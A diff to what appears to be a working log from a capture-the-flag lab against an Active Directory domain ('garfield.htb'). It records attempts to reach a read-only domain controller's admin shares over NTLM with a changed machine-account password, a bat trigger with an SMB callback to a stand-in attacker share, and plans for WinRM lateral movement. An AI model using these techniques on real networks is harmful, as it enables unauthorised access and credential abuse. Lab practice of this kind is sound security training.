@@ -507,3 +507,42 @@ Upload ONE bat that does BOTH password change AND exfil in a single trigger.
 This conserves the trigger mechanism. If Invoke-Command fails silently,
 the SMB callback (dir \\attacker\share) will still fire — proving the bat ran.
 If we get the SMB callback but no root.txt, we know Invoke-Command failed.
+
+## 10:03 — Comprehensive Review + New Idea
+
+### Reviewing 229 tested entries: 36 confirmed, 70 hard blocked
+
+### What I keep overlooking:
+The bat runs as l.wilson with a REAL Kerberos session. The double-hop 
+blocks Invoke-Command (delegation). But what about NTLM auth?
+
+net use \\192.168.100.2\C$ /user:garfield.htb\RODC01$ NewRodc1!
+
+This uses NTLM (IP-based = no Kerberos). NTLM doesn't need delegation.
+If RODC01 accepts NTLM auth from RODC01$ with our changed password,
+we can mount C$ and read root.txt directly.
+
+Previous failure: RODC01$ auth failed with 0x80090322 — but that was 
+KERBEROS (via Invoke-Command). NTLM is a different auth path.
+
+### Also untried:
+- net use from l.wilson_adm WinRM (NTLM to RODC01 IP — no double-hop issue with NTLM!)
+- smbclient-style access from inside bat via PowerShell New-SmbMapping
+
+## 10:04 — NTLM auth to RODC01 findings
+
+### KEY FINDING: l.wilson_adm CAN authenticate to RODC01 via NTLM
+- net use \\192.168.100.2\C$ with l.wilson_adm creds → Error 5 (access denied, NOT wrong password)
+- This means: NTLM auth works, l.wilson_adm password is known to RODC01
+- But: no admin share access (C$, NETLOGON both Error 5)
+
+### RODC01$ changed password NOT replicated
+- net use with RODC01$:NewRodc1! → Error 86 (wrong password)
+- RODC01 still has the OLD RODC01$ password
+- rpcclient password change on DC01 hasn't replicated to RODC
+
+### Next: try WinRM to RODC01 with NTLM explicit creds
+- l.wilson_adm can auth via NTLM to RODC01
+- WinRM on port 5985 may be open on RODC01 (need to verify)
+- Use PowerShell New-PSSession with explicit creds and -Authentication Negotiate
+- This avoids Kerberos delegation entirely
